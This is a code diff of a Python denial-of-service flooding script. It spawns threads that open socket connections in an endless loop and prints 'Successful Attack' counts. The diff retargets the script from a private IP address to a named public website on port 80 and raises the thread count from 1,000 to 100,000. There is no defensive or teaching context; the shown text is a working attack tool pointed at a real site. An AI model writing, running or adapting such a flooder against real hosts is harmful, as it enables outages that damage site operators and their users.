@@ -1,12 +1,14 @@
 import socket
 import threading
 
-target = "192.168.1.15" # The target IP address to scan for open ports.
-port = 135
+target = "www.nettruyenmax.com" # The target IP address to scan for open ports.
+port =80
 # i = 1
 fake_ip = "182.21.20.32"
 already_connected = 0
 def attack():
+    global size
+    global thread_list
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -21,17 +23,23 @@ def attack():
                 print("Successful Attack",already_connected)
                 # i = i + 1
         except:
-            print("Disconnected!!!")           
+            print("Disconnected!!!") 
+size = 100000
+thread_list = []                     
+def main():
+    global size
+    global thread_list
+    for i in range(size):
+        thread = threading.Thread(target=attack)
+        # thread.start()
+        thread_list.append(thread)
+    
+    for thread in thread_list:
+        thread.start()
+    
+    for thread in thread_list:
+        thread.join()
 
-size = 1000
-thread_list = []
-for i in range(size):
-    thread = threading.Thread(target=attack)
-    # thread.start()
-    thread_list.append(thread)
-    
-for thread in thread_list:
-    thread.start()
-    
-for thread in thread_list:
-    thread.join()
+        
+if __name__ == "__main__":
+    main()
